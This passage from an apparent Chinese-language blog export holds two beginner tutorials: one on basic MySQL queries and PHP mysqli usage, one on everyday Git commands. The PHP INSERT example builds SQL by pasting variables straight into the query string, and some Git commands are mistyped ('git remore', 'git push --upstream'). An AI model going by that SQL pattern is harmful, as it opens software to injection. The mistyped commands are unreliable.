下面演示一个取前两条数据 select * from stu limit 2; 回车之后显示 +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201801 | 某某 | 90 || 201810 | 啥啥 | 80 |+——–+——–+——-+2 rows in set (0.00 sec) 其他的就不举例了。自己可以试一试。 select * from XX（表名） limit n,m; （从第n条开始取m条数据 ） *select \\ from XX（表名） order by 字段x asc(desc) limit n;**（取某种排序下的前n条数据） 3.删除数据delete from XX（表名） where 字段x = 值x; 举例说明 delete from stu where id=201801; 回车之后，在查询表中的数据，看是不是少了第一条信息， select * from stu; 回车之后发现少了哪一行id=201801的数据。这样就删除数据成功了。 然后在使用select * from stu; 来看看自己是否真的删除成功了， +——–+——–+——-+| id | name | score |+——–+——–+——-+| 201810 | 啥啥 | 80 || 201810 | 啥啥 | 80 || 201820 | 嘿嘿 | 70 |+——–+——–+——-+3 rows in set (0.01 sec) 4.修改数据update XX（表名） set 字段1 = 值1,字段2 = 值2 where 条件;update XX（表名） set 字段1 = 值1; 下面一条的作用是修改某一字段的所有值，所以不需要加条件。 实例 update stu set id = 201710,name = “啦啦” where id = 201810 ; 回车之后显示 Query OK, 2 rows affected (0.01 sec)Rows matched: 2 Changed: 2 Warnings: 0 表示修改成功。 然后我们再来查询一下表的信息。 select * from stu; 回车之后显示 +——–+——–+——-+ id name score +——–+——–+——-+ 201710 啦啦 80 201710 啦啦 80 ———- ——– —— 201820 嘿嘿 70 ———- ——– —— +——–+——–+——-+ 3 rows in set (0.00 sec) 注意这里的第一条信息，已经改变了。 然后我们就可以在phpstrom中尝试这些语句，看是不是一样的。php部分入门 ①PHP中的变量，声明与使用，必须使用$开头。 ②PHP是一种弱类型语言，变量其实并不需要声明，可以直接给变量赋任何类型的值； ③PHP中可以使用连等同时声明多个变量。而不能使用逗号分隔。 eg：$num1=$num2=$num3=5; ④常用变量函数： unset()：删除并释放变量； isset()：检测变量是否设置； empty()：检测变量是否为空（未设置或值为Null都算空）； ⑤变量的命名：只能有字母数字下划线组成，开头不能是数字。而且，PHP中变量区分大小写！！$name,$Nnme,$NAME都是不同变量； 但是，PHP的内置函数不区分大小写！echo EcHo都是有效的。 连接这里面有[不再使用mysql_connect()来连接数据库]的解释 因为他 会显示 不推荐使用mysql扩展，将来会删除它 本扩展自 PHP 5.5.0 起已废弃，并在将来会被移除。应使用 MySQLi 或 PDO_MySQL 扩展来替换之。参见 MySQL：选择 API 指南以及相关 FAQ 以获取更多信息 详情请了解下面。 https://www.cnblogs.com/wangtao_20/p/4823088.html 连接解释： mysqli_connect_errno() 返回一个整数，标识连接数据库是否成功和各种错误的数值。 mysqli_connect_error() 返回连接错误信息。 以下是一些连接情况： mysqli_connect_errno mysqli_connect_error 2002 php_network_getaddresses: getaddrinfo failed: 不知道这样的主机。 1045 Access denied for user ‘wjj’@’localhost’ (using password: YES) 1049 Unknown database ‘test’ 0(连接成功) null 创建数据库语句：**$sql=’CREATE DATABASE aa ‘;**create database大小写都可以， PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库。该函数有两个参数，在执行成功时返回 TRUE，否则返回 FALSE。 删除数据库语句：**$sql=’DROP DATABASE aa ‘;** 在使用PHP脚本删除数据库时，不会出现确认是否删除信息，会直接删除指定数据库，所以你在删除数据库时要特别小心。千万小心。 选择数据库语句：mysqli_select_db($conn,’aa’);aa是指你选择的数据库名字，这个操作简单，不演示了。 创建数据表语句： $sql=”CREATE TABLE bb_1(“.**“bb_id INT NOT NULL AUTO_INCREMENT,”.“bb_title VARCHAR(100) NOT NULL,”.“bb_name VARCHAR(40) NOT NULL,”.“bb_data DATE, “.“PRIMARY KEY(bb_id))ENGINE=InnoDB DEFAULT CHARSET=utf8;”;** 一定要看清楚括号和, .;不要少一个多一个， PRIMARY KEY(bb_id)主键是Id AUTO_INCREMENT的意思是自己增加，id自己增加，这样方便一点。 ENGINE=InnoDB 表示将数据库的引擎设置为InnoDB,从MySQL 5.6开始默认使用该引擎。 DEFAULT CHARSET=utf8 表示设置数据库的默认字符集为utf8 删除数据表语句：$sql=”DROP TABLE bb_1”; mysqli_select_db($conn,’aa’); 一定不要忘记写这一句mysqli_select_db($conn,’aa’); 这一句的意思是说在这个aa数据库里面删除bb_1的数据表。 在数据表里面插入数据语句： $sql=”INSERT INTO bb_1”. “(bb_title,bb_name,bb_data)”.​​ “VALUES”.​​ “(‘$bb_title’,’$bb_name’,’$bb_data’)”;​​ 可以多插入几条数据，一样的形式，修改数据就好了。​​ 然后就可以在你的数据库里面看到这些数据了。​​​​ 查询数据1.1语句： $sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1’; bb_id,bb_title,bb_name,bb_data都是字段 bb_1是数据表名。 一定要注意括号一对一对的写，不要忘记html代码的连续性。 在上面的例子中，PHP mysqli_fetch_array() 函数第二个参数为 MYSQLI_ASSOC，设置该参数查询结果返回关联数组 PHP 提供了另外一个函数 mysqli_fetch_assoc(), 该函数从结果集中取得一行作为关联数组。返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。 在我们执行完 SELECT 语句后，释放游标内存是一个很好的习惯。 可以通过 PHP 函数 mysqli_free_result() 来实现内存的释放。 游标内存：存储Select的查询结果，并用来遍历。 查询数据1.2语句：**$sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1 WHERE bb_id=”2”‘;** WHERE相当于一个限制条件。比如这里面的只能是id 为2的数据被查出来。 查询数据1.3模糊查询 LIKE的使用。 语句： $sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1WHERE bb_name LIKE “%学习”‘; 还有一些用法 ‘%a’ //以a结尾的数据 ‘a%’ //以a开头的数据 ‘%a%’ //含有a的数据 ‘a‘ //三位且中间字母是a的 ‘_a’ //两位且结尾字母是a的 ‘a_’ //两位且开头字母是a的 查询数据1.3语句： $sql=’SELECT bb_id,bb_title,bb_name,bb_dataFROM bb_1ORDER BY bb_data ASC’; 按照时间的顺序排序。输出。 其他的和数据测试的一样。 修改数据语句： $sql=’UPDATE bb_1SET bb_name=”谁呀”WHERE bb_id=2’; WHERE是一个限制条件； 可以这样理解：update 表名称 set 列名称 = 新值 where 更新条件; 删除数据语句： $sql=’DELETE FROM bb_1WHERE bb_id=3’; delete，drop，truncate 都有删除表的作用，区别在于： 1、delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比 方，delete 是单杀，truncate 是团灭，drop 是把电脑摔了。 2、delete 是 DML 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和 drop 是 DDL 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手， 后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。 3、执行的速度上，drop&gt;truncate&gt;delete，打个比方，drop 是神舟火箭，truncate 是和谐号动车，delete 是自行车。 好了，到此结束，感谢大家。 参考链接：https://blog.csdn.net/qq_37236745/article/details/78694768 参考：菜鸟教程。","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"mysql","slug":"mysql","permalink":"https://yanmymickey.github.io/tags/mysql/"}]},{"title":"Git基础教程","date":"2018-11-19T16:00:00.000Z","path":"2018/11/20/Note/Git基础教程/","text":"Git基础教程Git 是一个分布式版本控制工具，最初由Linux之父Linus Torvalds创作，后托付滨野纯作为软件维护者。 详细历史见维基 git wiki Git的基本功能 项目管理初始化项目1git init 在项目根目录内使用此命令即将项目初始化为一个git仓库 下载远程项目1git clone [option] URL [dirname] [dirname] 设置新建目录的名字 option: -b &lt;branch&gt; 克隆指定分支 提交修改Git 有一个用于存储修改的暂存区，提交一次修改的过程首先需要添加文件到暂存区，然后再进行提交（commit），并填写提交记录 跟踪文件 &amp;&amp; 添加修改到暂存区1git add FILE FILE 需要添加到暂存区的文件，使用.来指代工作区全部文件 第一次添加的文件在之前是未跟踪（untracked）的状态，使用命令后会跟踪文件并将文件添加到暂存区； 已存在但是发生了修改的文件会添加进暂存区。 查看暂存区状态12git status # 查看暂存区状态git diff # 查看工作区与暂存区的区别 git diff若暂存区无修改则显示与当前版本的区别；也可使用git diff --cached来查看。 提交暂存区到版本1git commit [options] options: -a 提交全部未暂存的修改 -m MESSAGE 使用短字符串作为提交记录，不适用此参数则会进入系统编辑器编写commit记录 --amend 重新提交最近一次的修改记录 分支分支管理1git branch [options] [NAME] options: -a 显示所有分支（本地和远程） -d 删除分支（已合并） -D 强制删除分支 -v 显示最近一次提交 检出分支1git checkout [options] 检出到指定分支（切换分支），同时会撤销当前分支上未提交的所有修改（回退到当前分支的最新版本） options: &lt;file&gt; 撤销某个文件的修改 [branch_name] 切换分支 -b [branch_name]新建并切换分支 -b [branchname] [tagname] 在特定标签下创建分支 可以使用checkout来快速撤销当前分支所有修改 1git checkout . 合并分支1git merge NAME # 将指定分支合并到当前分支 常用分支名称 master 主分支，稳定分支，默认分支 dev 开发版本分支 fix#4 修复问题时的临时分支 标签Git可以给历史中的某一个提交打上标签，以示重要 比较有代表性的是用来标记发表结点（版本号） 123git tag # 列出标签git tag -l &#39;pattern&#39; # 用特定模式查找标签git show TAG # 查看标签信息与对应的提交信息 git标签分为轻量标签和附注标签两种 轻量标签像一个不会改变的分支（branch）- 它只是一个特定提交的引用。 附注标签是存储在Git数据库中的一个完整对象。 其中包含： 标签者的名字 电子邮件地址 日期时间 标签信息 它们可以使用GPG签名与验证 通常建议创建附注标签（信息量大），但如果你只是想用一个临时的标签，，或者因为某些原因不要保存那些信息，就使用轻量标签 创建标签git tag -a &lt;tagname&gt; -m &#39;comment&#39; 创建一个附注标签 -m 选项指定了将会存储在标签中的信息，如果没有指定，git将会运行编辑器要求你输入信息 git tag &lt;tagname&gt; 创建一个轻量标签 不需要使用-a、-s或-m选项，只需要提供标签名字 为之前的提交补充标签 1git tag -a &lt;tagname&gt; &lt;id&gt; id为要补充标签的提交的校验和（或部分校验和） 推送标签1git push &lt;remote&gt; &lt;tagname&gt; 默认情况下，git push命令并不会推送标 签到远程仓库。在创建完标签后你必须显式地推送标签，过程和推送远程分支一样 如果想要一次推送很多标签，也可以使用带有--tags选项的git push命令。这将会把所有不在远程仓库的标签全部推送到远程仓库 检出标签Git 中并不能真的检出一个标签，因为它们并不能像分支一样来回移动。如果你想要工作目录与仓库中特定的标签版本完全一样，可以使用 1git checkout -b &lt;branchname&gt; &lt;tagname&gt; 这将会在特定的标签上创建一个新分支 但是如果在这个分支上又进行了新提交，那么这个分支就会因为改动而向前移动导致和标签有所不同。 远程管理远程仓库1234git remore add origin URL # 添加远程仓库为origingit remote rm origin # 删除远程仓库origingit branch -r # 查看远程仓库的分支 推送123git push origin dev:dev # 将本地dev分支推送到origin&#x2F;devgit push REMOTE :BRANCH # 将空分支提交到远程分支，即删除远程分支git push --upstream origin master # 使当前分支跟踪远程分支 拉取1234git fetch origin master # 拉取远程仓库origin的master分支并存到分支origin&#x2F;master中git merge origin&#x2F;master # 将指定远程分支合并到当前分支中git pull origin master # 合并fetch与merge两个操作 配置文件123git config --list # 查看配置文件git config --list --global #git config add 项目管理流程 项目提交 初始化/下载项目 12git initgit clone url 创建修改 添加修改到暂存 1git add filename 提交暂存 1git commit -m &quot;log&quot; 远程协作 拉取 &amp; 合并远程分支 1234git fetch origin master # origin&#x2F;mastergit merge origin&#x2F;mastergit pull origin master 推送到远程仓库 1git push origin master 合并提交 &amp; 变基 12git fetch origin mastergit rebase origin&#x2F;master 版本管理 常驻分支 master development * fix#1000 为版本打标签 版本号规范 优雅的使用commit","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"git","slug":"git","permalink":"https://yanmymickey.github.io/tags/git/"}]}]